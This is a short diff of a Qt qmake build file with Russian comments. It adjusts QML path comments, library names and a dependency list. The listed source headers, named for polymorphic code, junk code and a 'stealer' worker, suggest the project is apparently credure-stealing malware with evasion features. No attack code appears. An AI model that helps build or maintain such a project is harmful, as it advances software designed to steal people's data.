@@ -38,15 +38,16 @@ INCLUDEPATH += \
     C:/vcpkg/installed/x64-mingw-dynamic/include \
     C:/Qt/5.15.2/mingw81_64/include
 
-# Пути для поиска QML-модулей
+# Пути для поиска QML-модулей (используется Qt Creator для автодополнения)
+# Для runtime нужно установить QML2_IMPORT_PATH в переменных окружения
 QML_IMPORT_PATH += \
     C:/Qt/5.15.2/mingw81_64/qml
 
 # Библиотеки для линковки
 LIBS += -LC:/vcpkg/installed/x64-mingw-dynamic/lib \
         -lsqlite3 \
-        -lzip \
-        -lz \
+        -llibzip \
+        -lzlib \
         -lbz2 \
         -lcurl \
         -lssl \
@@ -130,5 +131,4 @@ PRE_TARGETDEPS += \
     $$PWD/../src/polymorphic_code.h \
     $$PWD/../src/junk_code.h \
     $$PWD/../src/stealerworker.h \
-    $$PWD/../src/compat.h \
-    $$UI_DIR/ui_mainwindow.h
+    $$PWD/../src/compat.h
